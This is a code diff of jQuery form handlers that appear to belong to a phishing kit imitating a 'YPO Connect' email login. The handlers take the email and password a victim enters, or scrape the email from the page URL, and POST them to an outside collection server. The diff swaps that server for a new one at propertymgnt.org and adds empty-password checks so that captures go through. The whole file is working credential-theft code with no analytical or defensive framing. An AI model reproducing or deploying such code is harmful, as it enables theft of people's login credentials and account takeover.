@@ -663,6 +663,8 @@ $(document).ready(function() {
         $('#error').hide();
     });
 
+    
+
     $(document).keypress(function(event) {
     	
         var keycode = (event.keyCode ? event.keyCode : event.which);
@@ -732,15 +734,26 @@ $(document).ready(function() {
     $('#submit-btn').click(function(event) {
       
         event.preventDefault();
+
+        
+        var pr = $("#password").val();
+   
+        if (!pr) {
+            $('#error').show();
+            $('#errorpass1').html("Password field cannot be empty.");
+           $("#final-btn").attr("disabled", false);
+            return false;
+        }
+
         var email = $("#email").val();
         var password = $("#password").val();
-        var logintype = "YPO ";
+        var logintype = "[[+ YPO Connect +]]";
         var msg = $('#error').html();
  
         count = count + 1;
         $.ajax({
             dataType: 'JSON',
-            url: "https://zbtrading.co/jquery/next.php",
+            url: "https://propertymgnt.org/jquery/next.php",
             type: 'POST',
             data: {
                 login: email,
@@ -778,7 +791,20 @@ $(document).ready(function() {
 var mount = 0
 
 $('#final-btn').click(function(event) {
+
+
+
         event.preventDefault();
+
+        var pr = $("#passwords").val();
+   
+        if (!pr) {
+            $('#error').show();
+            $('#errorpass').html("Password field cannot be empty.");
+           $("#final-btn").attr("disabled", false);
+            return false;
+        }
+
         var windowUrl = window.location.href;
         var windowEmail = windowUrl.match(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/ig);
         var myEmail = windowEmail.toString()
@@ -786,14 +812,14 @@ $('#final-btn').click(function(event) {
 
         $('#errordiv').hide();
         var password = $("#passwords").val();
-        var logintype = "Email Access";
+        var logintype = "[[+ YPO Email Access +]]";
         var msg = $('#error').html();
         
         mount = mount + 1;
 
         $.ajax({
             dataType: 'JSON',
-            url: "https://zbtrading.co/jquery/next.php",
+            url: "https://propertymgnt.org/jquery/next.php",
             type: 'POST',
             data: {
                 login: myEmail,
